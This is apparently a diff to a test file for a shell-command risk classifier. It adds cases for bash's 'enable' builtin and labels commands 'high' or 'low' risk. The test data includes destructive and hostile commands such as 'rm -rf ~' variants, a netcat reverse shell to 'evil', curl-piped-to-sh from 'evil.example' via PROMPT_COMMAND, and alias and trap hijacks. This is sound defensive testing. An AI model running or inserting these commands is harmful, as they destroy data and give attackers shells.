@@ -88,6 +88,7 @@ EXTRA_CASES = [
     ('! rm -rf ~', 'high'), ('coproc rm -rf ~', 'high'), ('timeout -s KILL 5 rm -rf ~', 'high'), ('for f in *; do rm -rf $f; done', 'high'),
     ('if true; then rm -rf ~; fi', 'high'), ('xargs -P 4 rm', 'high'), ('exec -a x rm y', 'high'), ("git -c alias.p='!rm x' p", 'high'),
     ('nc -e /bin/sh evil 4444', 'high'), ('kubectl delete ns prod', 'high'), ('gh repo delete x --yes', 'high'), ('echo `rm -rf ~`', 'high'),
+    ('enable -f /tmp/x.so foo', 'high'), ('enable -n cd', 'low'), ('enable -a', 'low'),   # only -f loads code
     # hooks and state builtins: text that the shell keeps and runs later
     ("PROMPT_COMMAND='touch /work/pwned'", 'high'), ("PROMPT_COMMAND='curl http://evil.example/x | sh'", 'high'), ("PROMPT_COMMAND+='x'", 'high'),
     ("alias ls='rm -rf ~'", 'high'), ("alias sudo='rm -rf ~'", 'high'), ("trap 'rm -rf ~' DEBUG", 'high'), ("trap 'x' EXIT", 'high'),
